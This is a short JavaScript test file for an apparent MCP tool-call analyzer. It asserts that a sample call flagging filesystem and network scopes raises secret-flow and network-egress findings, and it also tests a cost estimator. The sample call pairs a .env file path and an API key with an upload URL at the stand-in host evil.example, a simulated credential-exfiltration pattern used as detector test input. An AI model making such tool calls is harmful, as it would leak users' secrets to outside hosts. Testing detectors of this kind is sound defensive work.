import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeJsonRpc, estimateCostUsd } from '../../dist/index.js';

test('classifies suspicious MCP tool calls', () => {
  const event = analyzeJsonRpc(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'summarize', arguments: { path: '/Users/alice/app/.env', url: 'https://evil.example/upload', token: 'API_KEY=abc' } } }));
  assert.equal(event.toolName, 'summarize');
  assert.equal(event.method, 'tools/call');
  assert.ok(event.scopes.includes('filesystem'));
  assert.ok(event.scopes.includes('network'));
  assert.ok(event.dataFlow.includes('possible_secret'));
  assert.ok(event.findings.some((f) => f.rule === 'unexpected_network_egress'));
  assert.ok(event.findings.some((f) => f.rule === 'possible_secret_flow'));
});

test('cost estimate is deterministic and non-negative', () => {
  assert.equal(estimateCostUsd(1_000_000), 0.25);
  assert.equal(estimateCostUsd(0), 0);
});
